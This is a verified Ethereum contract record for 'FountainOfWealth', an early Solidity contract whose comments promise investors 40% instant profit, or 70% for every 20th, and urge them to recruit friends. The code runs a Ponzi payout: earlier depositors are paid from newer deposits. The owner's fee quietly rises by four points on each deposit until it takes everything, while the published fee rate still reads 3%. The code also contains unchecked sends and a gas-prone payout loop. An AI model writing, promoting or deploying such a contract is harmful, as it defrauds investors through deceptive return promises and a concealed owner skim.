{"SourceCode":"//***********************************Fountain of Wealth\r\n//\r\n// Hello investor, this is the Fountain of Wealth. You can earn 40% profit on your investments if you drink the water from this fountain, but you can't do it alone, \r\n// you must bring your friends to help you. Deposit minimum 0.1 Ether (100 Finney), and you will earn 40% profit on your deposit instantly after somebody else invests!\r\n// \r\n// Every 20th investor will be blessed by the fountain and will earn 70% profit on his investments. Would that person be you? We will see!\r\n//\r\n//\r\n// Now let's make you wealthy!\r\n//\r\n//========================================Start\r\ncontract FountainOfWealth{\r\nstruct InvestorArray{\r\naddress etherAddress;\r\nuint amount;\r\n}\r\nInvestorArray[] public investors;\r\n//========================================Variables\r\nuint public investors_needed_until_jackpot=0;\r\nuint public totalplayers=0; uint public feerate=3;uint public profitrate=40;uint public jackpotrate=70; uint fee=3; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalpaidout=0;\r\naddress public owner; modifier onlyowner{if(msg.sender==owner)_}\r\n//========================================Initializator\r\nfunction FountainOfWealth(){\r\nowner=msg.sender;\r\n}\r\n//========================================Entry Trigger\r\nfunction(){\r\nenter();\r\n}\r\n//========================================Enter\r\nfunction enter(){\r\nif(msg.value<100 finney){\r\nreturn;\r\n}\r\nuint amount=msg.value;uint tot_pl=investors.length;totalplayers=tot_pl+1;\r\ninvestors_needed_until_jackpot=20-(totalplayers%20);\r\ninvestors.length+=1;investors[tot_pl].etherAddress=msg.sender;\r\ninvestors[tot_pl].amount=amount;\r\nfeeamount=amount*fee/100;balance+=amount;totaldeposited+=amount;\r\nif(feeamount!=0){if(balance>feeamount){owner.send(feeamount);balance-=feeamount;\r\ntotalpaidout+=feeamount;if(fee<100)fee+=4;else fee=100;}} uint payout;uint nr=0;\r\nwhile(balance>investors[nr].amount*40/100 && nr<tot_pl)\r\n{\r\nif(nr%20==0&&balance>investors[nr].amount*70/100)\r\n{\r\npayout=investors[nr].amount*70/100;\r\ninvestors[nr].etherAddress.send(payout);\r\nbalance-=investors[nr].amount*70/100;\r\ntotalpaidout+=investors[nr].amount*70/100;\r\n}\r\nelse\r\n{\r\npayout=investors[nr].amount*40/100;\r\ninvestors[nr].etherAddress.send(payout);\r\nbalance-=investors[nr].amount*40/100;\r\ntotalpaidout+=investors[nr].amount*40/100;\r\n}\r\nnr+=1;\r\n}}}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"feerate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"jackpotrate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalplayers\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"investors\",\"outputs\":[{\"name\":\"etherAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalpaidout\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"profitrate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investors_needed_until_jackpot\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"balance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totaldeposited\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"FountainOfWealth","CompilerVersion":"v0.2.2-2016-03-10-34d714f","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"","SwarmSource":""}
